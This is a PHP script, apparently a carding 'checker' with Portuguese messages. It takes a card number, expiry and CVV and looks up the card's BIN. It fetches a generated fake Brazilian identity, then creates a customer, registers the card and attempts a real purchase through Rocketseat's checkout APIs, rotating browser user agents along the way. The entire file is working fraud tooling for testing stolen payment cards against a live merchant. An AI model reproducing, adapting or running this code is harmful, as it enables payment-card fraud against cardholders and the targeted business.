<?php
error_reporting(0);
$start_time = microtime(true);
$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
echo 'Lista Vazia, Preencha um Cartao! cc|mes|ano|cvv @DIDIAC68';
exit();
}

$lista = $lista[0];
$cc = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];


function getStr($string, $start, $end) {
    $str = explode($start, $string);
    if (isset($str[1])) {
        $str = explode($end, $str[1]);
        return trim($str[0]);
    }
    return 'Não encontrado';
}

function getRandomUserAgent() {
    $userAgents = [

        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',

        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',

        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',

        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0',

        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:119.0) Gecko/20100101 Firefox/119.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:118.0) Gecko/20100101 Firefox/118.0',

        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0',
        'Mozilla/5.0 (X11; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0',

        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',

        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.1 Safari/537.36',

        'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',

        'Mozilla/5.0 (Android 14; Mobile; rv:119.0) Gecko/119.0 Firefox/119.0',
        'Mozilla/5.0 (Android 13; Mobile; rv:118.0) Gecko/118.0 Firefox/118.0',

        'Mozilla/5.0 (Linux; Android 13; SM-S918U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/120.0.0.0 Mobile Safari/537.36',

        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/94.0.0.0',

        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Brave/121.0.0.0',

        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Vivaldi/6.0.0.0',

        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/537.36',

        'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/537.36',
        'Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/537.36',

        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',

        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',

        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 YaBrowser/23.0.0.0 Safari/537.36',
    ];

    return $userAgents[array_rand($userAgents)];
}

function multiexplode($string) {
 $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<", " ");
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}

$bin = substr($cc, 0, 6);

$last4 = substr($cc, 0, -4);

extract($_GET);
$lista = str_replace(" " , "|", $lista);
$lista = str_replace("%20", "|", $lista);
$lista = preg_replace('/[ -]+/' , '-' , $lista);
$lista = str_replace("/" , "|", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$lista = ("$cc|$mes|$ano|$cvv");

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://bins.su/");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded',
'Host: bins.su'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&bank=&country=');
$dados1 = curl_exec($ch);

$bin = getStr($dados1, 'bins<table><tr><td>BIN</td><td>Country</td><td>Vendor</td><td>Type</td><td>Level</td><td>Bank</td></tr><tr><td>','</td><td>' , 1);
$pais = getStr($dados1, '<tr><td>'.$bin.'</td><td>','</td><td>' , 1);
$bandeira = getStr($dados1, '</td><td>'.$pais.'</td><td>','</td><td>' , 1);
$tipo = getStr($dados1, '</td><td>'.$bandeira.'</td><td>','</td><td>' , 1);
$nivel = getStr($dados1, '</td><td>'.$tipo.'</td><td>','</td><td>' , 1);
$banco = getStr($dados1, '</td><td>'.$nivel.'</td><td>','</td></tr>' , 1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.4devs.com.br/ferramentas_online.php');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: */*',
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.168 Safari/537.36',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
));

curl_setopt($ch, CURLOPT_POSTFIELDS, "acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=");
$dat = curl_exec($ch);

    $json_start_pos = strpos($dat, '[');
    $json_end_pos = strrpos($dat, ']');

    if ($json_start_pos !== false && $json_end_pos !== false)

        $json_content = substr($dat, $json_start_pos, $json_end_pos - $json_start_pos + 1);
        
        $response = json_decode($json_content, true);

        if ($response)
            $email = $response[0]['email'] ?? 'Não disponível';
            $nome = $response[0]['nome'] ?? 'Não disponível';
            $cpf = $response[0]['cpf'] ?? 'Não disponível';
            $celular = $response[0]['celular'] ?? 'Não disponível';
            $endereco = $response[0]['endereco'] ?? 'Não disponível';
            $cidade = $response[0]['cidade'] ?? 'Não disponível';
            $estado = $response[0]['estado'] ?? 'Não disponível';
            $cep = $response[0]['cep'] ?? 'Não disponível';
            $numero = $response[0]['numero'] ?? 'Não disponível';
            $nascimento = $response[0]['data_nasc'] ?? 'Não disponível';
            $senha = $response[0]['senha'] ?? 'Não disponível';
            $bairro = $response[0]['bairro'] ?? 'Não disponível';

            $nome_split = explode(' ', $nome);
            $primeiro_nome = $nome_split[0] ?? 'Não disponível';
            $sobrenome = isset($nome_split[1]) ? implode(' ', array_slice($nome_split, 1)) : 'Não disponível'; 

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://app.rocketseat.com.br/api/hubspot/contacts');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'accept: application/json, text/plain, */*',
                'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
                'cache-control: no-cache',
                'content-type: application/json',
                'origin: https://app.rocketseat.com.br',
                'pragma: no-cache',
                'priority: u=1, i',
                'referer: https://app.rocketseat.com.br/cart/rocketseat-one?utm_source=google&utm_medium=cpc',
                'User-Agent: ' . getRandomUserAgent(),
            ]);
           
            curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"'.$email.'","properties":{"begin_checkout":"rocketseat-one"}}');
            
            $response = curl_exec($ch);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://alpaca.rocketseat.com.br/pluto/graphql');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'accept: */*',
                'accept-language: pt-BR,pt;q=0.9',
                'authorization: ',
                'cache-control: no-cache',
                'content-type: application/json',
                'origin: https://app.rocketseat.com.br',
                'pragma: no-cache',
                'priority: u=1, i',
                'referer: https://app.rocketseat.com.br/',
                'User-Agent: ' . getRandomUserAgent(),
            ]);
            curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"operationName\":\"CreateCustomer\",\"variables\":{\"customerData\":{\"name\":\"$nome\",\"email\":\"$email\",\"phone\":\"$celular\",\"fiscalDocument\":\"$cpf\",\"thirdPartyFiscalDocument\":\"$cpf\",\"address\":{\"countryCode\":\"BR\",\"postalCode\":\"$cep\",\"city\":\"$cidade\",\"state\":\"$estado\",\"street\":\"$endereco\",\"number\":\"$numero\",\"complement\":\"\",\"neighborhood\":\"$bairro\"},\"paymentEngine\":\"BARTE\"}},\"query\":\"mutation CreateCustomer(\$customerData: CreateCustomerInput!) {\\n  createCustomer(data: \$customerData) {\\n    id\\n    externalId\\n    atlasUserId\\n    __typename\\n  }\\n}\"}");
            
            $response = curl_exec($ch);

            $id = getStr($response, '"externalId":"' ,'",');

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://app.rocketseat.com.br/api/checkout/card');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'accept: application/json, text/plain, */*',
                'accept-language: pt-BR,pt;q=0.9',
                'cache-control: no-cache',
                'content-type: application/json',
                'origin: https://app.rocketseat.com.br',
                'pragma: no-cache',
                'priority: u=1, i',
                'referer: https://app.rocketseat.com.br/cart/rocketseat-one?utm_source=google&utm_medium=cpc',
                'User-Agent: ' . getRandomUserAgent(),
            ]);
           
            curl_setopt($ch, CURLOPT_POSTFIELDS, '{"holderName":"'.$nome.'","number":"'.$cc.'","cvv":"'.$cvv.'","expiration":"'.$mes.'/'.$ano.'","customerId":"'.$id.'"}');
            
           $response = curl_exec($ch);

           $cardid = getStr($response, '"uuid":"' ,'",');

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://alpaca.rocketseat.com.br/pluto/graphql');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'accept: */*',
                'accept-language: pt-BR,pt;q=0.9',
                'authorization: ',
                'cache-control: no-cache',
                'content-type: application/json',
                'origin: https://app.rocketseat.com.br',
                'pragma: no-cache',
                'priority: u=1, i',
                'referer: https://app.rocketseat.com.br/',
                'User-Agent: ' . getRandomUserAgent(),
            ]);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '{"operationName":"CreatePurchase","variables":{"purchaseData":{"offersSlugs":["rocketseat-one"],"paymentMethod":"CREDIT_CARD","paymentInfo":{"creditCard":{"cardId":"'.$cardid.'","brand":"visa","cvv":"'.$cvv.'","lastFourDigits":"'.$last4.'","installments":12}},"customerId":"'.$id.'","customerEmail":"'.$email.'","couponCode":null,"paymentEngine":"BARTE","metadata":{"utm_source":"google","utm_medium":"cpc"},"referralUserId":null,"referral":null,"attemptReference":"117b0d83-cf7d-418e-b58a-204f814f357c"}},"query":"mutation CreatePurchase($purchaseData: CreatePurchaseInput!) {\\n  createPurchase(data: $purchaseData) {\\n    id\\n    metadata\\n    __typename\\n  }\\n}"}');
            
          echo $response = curl_exec($ch);

           